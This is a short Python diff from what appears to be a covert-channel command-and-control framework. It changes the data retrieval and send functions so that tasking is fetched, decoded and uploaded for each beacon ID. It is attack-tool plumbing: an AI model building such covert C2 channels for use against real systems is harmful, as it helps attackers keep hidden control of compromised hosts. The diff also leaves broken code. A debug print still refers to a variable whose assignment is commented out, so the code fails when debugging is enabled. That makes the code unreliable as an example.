@@ -47,21 +47,25 @@ def decodeData(data):
 	rdyData = encoder.decode(data)
 	return rdyData
 
-def retrieveData():
+def retrieveData(beaconId):
 	# This will retireve data via the covert channel
 	# Returns unencoded data
 
-	data = transport.retrieveData()
+	taskData = transport.retrieveData(beaconId)
+	# data = transport.retrieveData(beaconId)
 
 	if config.debug:
 		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
 
 	# Prepare the recieved data by running it through the decoder
-	preped_data = decodeData(data)
+	for i in xrange(len(taskData)):
+		taskData[i] = decodeData(taskData[i])
+	# preped_data = decodeData(data)
 
-	return preped_data
+	# return preped_data
+	return taskData
 
-def sendData(data):
+def sendData(data, beaconId):
 	# This will upload the data via the covert channel
 	# returns a confirmation that the data has been sent
 
@@ -70,7 +74,7 @@ def sendData(data):
 	# Prepares the data to be sent via the covert channel
 	preped_data = prepData(data)
 
-	transport.sendData(preped_data)
+	transport.sendData(preped_data, beaconId)
 
 def color(string, status=True, warning=False, bold=True, yellow=False):
 	"""
@@ -95,3 +99,4 @@ def color(string, status=True, warning=False, bold=True, yellow=False):
 
 # TODO: add a function that handles logic for when a session exits to notify the c2 controller. Right now, this could/would only ever by killing the socket.
 #       if the spec ever changes to support restoration for sessions, then this can become a priority.
+
